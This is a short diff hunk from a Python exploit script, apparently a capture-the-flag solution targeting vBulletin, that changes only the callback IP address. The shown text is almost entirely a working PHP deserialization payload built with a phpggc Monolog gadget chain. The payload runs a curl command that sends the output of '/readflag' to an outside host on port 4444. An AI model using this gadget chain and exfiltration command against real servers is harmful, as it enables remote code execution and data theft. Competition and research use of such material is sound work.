@@ -96,8 +96,8 @@ def main():
 
     # https://www.ambionics.io/blog/vbulletin-unserializable-but-unreachable
     serial_object = 'a:2:{i:0;O:28:"www_frontend_vendor_autoload":0:{}i:1;'
-    # ./phpggc Monolog/RCE6 system "curl http://180.129.100.155:4444/?c=\$(/readflag)" -a 2>/dev/null | grep O:
-    serial_object += 'O:37:"Monolog\Handler\FingersCrossedHandler":3:{S:16:"\00*\00passthruLevel";i:0;S:9:"\00*\00buffer";a:1:{S:4:"test";a:2:{i:0;S:48:"curl http://180.129.100.155:4444/?c=$(/readflag)";S:5:"level";N;}}S:10:"\00*\00handler";O:29:"Monolog\Handler\BufferHandler":7:{S:10:"\00*\00handler";N;S:13:"\00*\00bufferSize";i:-1;S:9:"\00*\00buffer";N;S:8:"\00*\00level";N;S:14:"\00*\00initialized";b:1;S:14:"\00*\00bufferLimit";i:-1;S:13:"\00*\00processors";a:2:{i:0;S:7:"current";i:1;S:6:"system";}}}'
+    # ./phpggc Monolog/RCE6 system "curl http://1.2.3.4:4444/?c=\$(/readflag)" -a 2>/dev/null | grep O:
+    serial_object += 'O:37:"Monolog\Handler\FingersCrossedHandler":3:{S:16:"\00*\00passthruLevel";i:0;S:9:"\00*\00buffer";a:1:{S:4:"test";a:2:{i:0;S:48:"curl http://1.2.3.4:4444/?c=$(/readflag)";S:5:"level";N;}}S:10:"\00*\00handler";O:29:"Monolog\Handler\BufferHandler":7:{S:10:"\00*\00handler";N;S:13:"\00*\00bufferSize";i:-1;S:9:"\00*\00buffer";N;S:8:"\00*\00level";N;S:14:"\00*\00initialized";b:1;S:14:"\00*\00bufferLimit";i:-1;S:13:"\00*\00processors";a:2:{i:0;S:7:"current";i:1;S:6:"system";}}}'
     serial_object += '}'
 
     # Update admin access serial object
